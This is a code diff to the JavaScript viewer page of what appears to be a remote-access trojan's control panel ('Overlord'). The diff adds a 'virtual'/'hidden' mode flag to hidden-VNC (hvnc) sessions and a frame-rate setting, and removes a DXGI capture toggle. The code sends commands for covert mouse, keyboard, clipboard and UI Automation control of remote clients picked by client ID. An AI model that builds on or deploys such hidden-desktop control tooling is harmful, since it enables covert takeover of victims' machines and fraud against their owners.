@@ -6,17 +6,35 @@ import { P2PClient } from "./webrtc-p2p.js";
 import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-settings.js";
 
 (async function () {
-  const clientId = new URLSearchParams(location.search).get("clientId");
+  const urlParams = new URLSearchParams(location.search);
+  const clientId = urlParams.get("clientId");
   if (!clientId) {
     alert("Missing clientId");
     return;
   }
+  // The launcher uses mode=virtual. Keep mode=hidden as a compatibility alias
+  // for older bookmarked URLs.
+  const virtualMode = ["virtual", "hidden"].includes(urlParams.get("mode"));
 
   const allowed = await checkFeatureAccess("hvnc", clientId);
   if (!allowed) return;
 
   const clientLabel = document.getElementById("clientLabel");
   clientLabel.textContent = clientId;
+
+  if (virtualMode) {
+    document.title = "Overlord Virtual";
+    const headerSpan = document.querySelector(".p-3.text-sm.text-slate-400 span");
+    if (headerSpan) {
+      headerSpan.textContent = "Virtual Mode (Virtual Monitor) - Client: ";
+      headerSpan.appendChild(clientLabel);
+    }
+    const ghostIcon = document.querySelector(".p-3.text-sm.text-slate-400 .fa-ghost");
+    if (ghostIcon) {
+      ghostIcon.classList.remove("fa-ghost", "text-violet-400");
+      ghostIcon.classList.add("fa-eye-slash", "text-fuchsia-400");
+    }
+  }
 
   let ws = null;
   let reconnectTimer = null;
@@ -78,9 +96,9 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   const viewerFps = document.getElementById("viewerFps");
   const statusEl = document.getElementById("streamStatus");
   const clipboardSyncCtrl = document.getElementById("clipboardSyncCtrl");
-  const dxgiCtrl = document.getElementById("dxgiCtrl");
   const uiaCtrl = document.getElementById("uiaCtrl");
   const hvncResolutionSelect = document.getElementById("hvncResolutionSelect");
+  const targetFpsSelect = document.getElementById("targetFpsSelect");
   let whepClient = null;
   let p2pClient = null;
   let webrtcActive = false;
@@ -92,7 +110,6 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function syncInputEnableState() {
     if (mouseCtrl) sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
     if (kbdCtrl) sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
-    if (dxgiCtrl) sendCmd("hvnc_enable_dxgi", { enabled: dxgiCtrl.checked });
     if (uiaCtrl) sendCmd("hvnc_enable_uia", { enabled: uiaCtrl.checked });
     pushHvncResolution();
   }
@@ -142,12 +159,12 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     if (!settings || typeof settings !== "object") return;
     savedDisplay = Number.isFinite(Number(settings.display)) ? Number(settings.display) : savedDisplay;
     setSelectValue(hvncResolutionSelect, settings.resolution);
+    setSelectValue(targetFpsSelect, settings.targetFps);
     setSelectValue(webrtcMode, settings.webrtcMode);
     if (qualitySlider && settings.quality !== undefined) qualitySlider.value = String(settings.quality);
     if (mouseCtrl && typeof settings.mouse === "boolean") mouseCtrl.checked = settings.mouse;
     if (kbdCtrl && typeof settings.keyboard === "boolean") kbdCtrl.checked = settings.keyboard;
     if (clipboardSyncCtrl && typeof settings.clipboardSync === "boolean") clipboardSyncCtrl.checked = settings.clipboardSync;
-    if (dxgiCtrl && typeof settings.dxgi === "boolean") dxgiCtrl.checked = settings.dxgi;
     if (uiaCtrl && typeof settings.uia === "boolean") uiaCtrl.checked = settings.uia;
     if (typeof settings.preferH264 === "boolean") {
       prefersH264 = settings.preferH264 && typeof VideoDecoder === "function";
@@ -167,13 +184,13 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     return {
       display: Number(displaySelect?.value || 0),
       resolution: hvncResolutionSelect?.value || "1080",
+      targetFps: Number(targetFpsSelect?.value || 120),
       quality: Number(qualitySlider?.value || 90),
       preferH264: !!prefersH264,
       webrtcMode: getWebrtcMode(),
       mouse: !!mouseCtrl?.checked,
       keyboard: !!kbdCtrl?.checked,
       clipboardSync: !!clipboardSyncCtrl?.checked,
-      dxgi: !!dxgiCtrl?.checked,
       uia: !!uiaCtrl?.checked,
       cloneProfile: document.getElementById("hvncCloneToggle")?.checked !== false,
       cloneLite: document.getElementById("hvncCloneLiteToggle")?.checked === true,
@@ -369,9 +386,11 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
             display: parseInt(displaySelect.value, 10) || 0,
           });
         }
+        pushTargetFps();
         sendCmd("hvnc_start", {
           autoStartExplorer: false,
           webrtc: mode === "relayed",
+          ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}),
         });
         if (mode === "p2p") startP2P();
         syncInputEnableState();
@@ -903,6 +922,22 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     sendCmd("hvnc_set_quality", { quality: q, codec });
   }
 
+  function selectedTargetFps() {
+    const fps = Number(targetFpsSelect?.value || 120);
+    return Number.isFinite(fps) ? Math.max(1, Math.min(240, Math.floor(fps))) : 120;
+  }
+
+  function pushTargetFps() {
+    sendCmd("hvnc_set_fps", { fps: selectedTargetFps() });
+  }
+
+  if (targetFpsSelect) {
+    targetFpsSelect.addEventListener("change", function () {
+      pushTargetFps();
+      sharedSettingsSaver.scheduleSave();
+    });
+  }
+
   function pushTransportQuality(mode) {
     if (mode === "relayed" || mode === "p2p") {
       const q = Number(qualitySlider?.value) || 90;
@@ -1046,12 +1081,14 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       });
     }
     pushTransportQuality(mode);
+    pushTargetFps();
     desiredStreaming = true;
     lastFrameAt = 0;
     setStreamState("starting", "Starting stream");
     sendCmd("hvnc_start", {
       autoStartExplorer: false,
       webrtc: mode === "relayed",
+      ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}),
     });
     if (mode === "p2p") startP2P();
     syncInputEnableState();
@@ -1084,12 +1121,6 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
     sharedSettingsSaver.scheduleSave();
   });
-  if (dxgiCtrl) {
-    dxgiCtrl.addEventListener("change", function () {
-      sendCmd("hvnc_enable_dxgi", { enabled: dxgiCtrl.checked });
-      sharedSettingsSaver.scheduleSave();
-    });
-  }
   if (uiaCtrl) {
     uiaCtrl.addEventListener("change", function () {
       sendCmd("hvnc_enable_uia", { enabled: uiaCtrl.checked });
@@ -1404,7 +1435,8 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       if (displaySelect && displaySelect.value !== undefined) {
         sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) || 0 });
       }
-      sendCmd("hvnc_start", { autoStartExplorer: false, webrtc: mode === "relayed" });
+      pushTargetFps();
+      sendCmd("hvnc_start", { autoStartExplorer: false, webrtc: mode === "relayed", ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}) });
       if (mode === "p2p") startP2P();
       syncInputEnableState();
     } else {
